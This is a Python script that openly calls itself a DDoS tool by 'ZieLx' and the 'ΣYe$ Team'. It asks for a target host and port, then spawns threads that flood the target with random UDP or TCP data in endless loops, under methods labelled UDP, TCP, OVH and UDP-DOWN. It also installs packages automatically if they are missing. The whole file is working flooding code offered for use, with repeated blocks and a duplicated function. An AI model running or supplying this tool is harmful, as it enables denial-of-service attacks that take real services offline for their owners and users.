import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

from time import time as tt
import threading
import socket
import random
import time

os.system("cls")
print("""\033[31m
...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\
       ::::::;       ;          OOOOO\
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O
  `:::::`::::::::;' /  / `:#
   ::::::`:::::;'  /  /   `#
                      \033[37m 
                      Welcome Human
                   DDoS Tools By ZieLx
                        ΣYe$ Team

\033[31m============================================================

\033[37m[\033[31m!\033[37m] Methods :
\033[37m[\033[31m1\033[37m] UDP
\033[37m[\033[31m2\033[37m] TCP
\033[37m[\033[31m3\033[37m] OVH
\033[37m[\033[31m4\033[37m] UDP-DOWN
\033[37m[\033[31m0\033[37m] EXIT

\033[31m============================================================

                         """)
                         
choice =str(input("\033[37m[\033[31m!\033[37m] Choice Number : \033[31m"))
os.system("cls")
if choice == '0':
	exit()
print("""\033[31m
...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\
       ::::::;       ;          OOOOO\
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O
  `:::::`::::::::;' /  / `:#
   ::::::`:::::;'  /  /   `#

                      \033[37m 
                   DDoS Tools By ZieLx
                        ΣYe$ Team
                      
                          """)
ip =str(input("\033[37m[\033[31m!\033[37m] Host/Ip Target : \033[31m"))
port =int(input("\033[37m[\033[31m!\033[37m] Port Target : \033[31m"))
times =int(input("\033[37m[\033[31m!\033[37m] Times : \033[31m"))
threads =int(input("\033[37m[\033[31m!\033[37m] Size : \033[31m"))

def udp():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP. ".format(ip,port))
		except:
			print("\033[37m[\033[31m!\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP. ".format(ip,port))
			
def udp2():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m-\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP. ".format(ip,port))
		except:
			print("\033[37m[\033[31m+\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP. ".format(ip,port))
			
def udp3():
	data = random._urandom(696969)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP. ".format(ip,port))
			
def tcp():
	data = random._urandom(20179)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mTCP. ".format(ip,port))
		except:
			s.close()
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mTCP. ".format(ip,port))
			
def tcp2():
	data = random._urandom(577)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mTCP. ".format(ip,port))
		except:
			s.close()
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mTCP. ".format(ip,port))
			
def tcp3():
	data = random._urandom(102400)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mTCP. ".format(ip,port))
		except:
			s.close()
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mTCP. ".format(ip,port))
			
def ovh():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
			
def ovh():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
			
def ovh2():
	data = random._urandom(1021)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
			
def ovh3():
	data = random._urandom(65500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mOVH. ".format(ip,port))
			
def udpdown():
	data = random._urandom(1021)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP-DOWN. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP-DOWN. ".format(ip,port))
			
def udpdown2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP-DOWN. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP-DOWN. ".format(ip,port))
			
def udpdown3():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP-DOWN. ".format(ip,port))
		except:
			print("\033[37m[\033[31m•\033[37m] ZieL Attacking Ip: \033[31m{}, \033[37mPort: \033[31m{}, \033[37mMethods: \033[31mUDP-DOWN. ".format(ip,port))
			
for y in range(threads):
	if choice == '1':
		th = threading.Thread(target = udp)
		th.start()
		th = threading.Thread(target = udp2)
		th.start()
		th = threading.Thread(target = udp3)
		th.start()
	elif choice == '2':
		th = threading.Thread(target = tcp)
		th.start()
		th = threading.Thread(target = tcp2)
		th.start()
		th = threading.Thread(target = tcp3)
		th.start()
	elif choice == '3':
		th = threading.Thread(target = ovh)
		th.start()
		th = threading.Thread(target = ovh2)
		th.start()
		th = threading.Thread(target = ovh3)
		th.start()
	elif choice == '4':
		th = threading.Thread(target = udpdown)
		th.start()
		th = threading.Thread(target = udpdown2)
		th.start()
		th = threading.Thread(target = udpdown3)
		th.start()
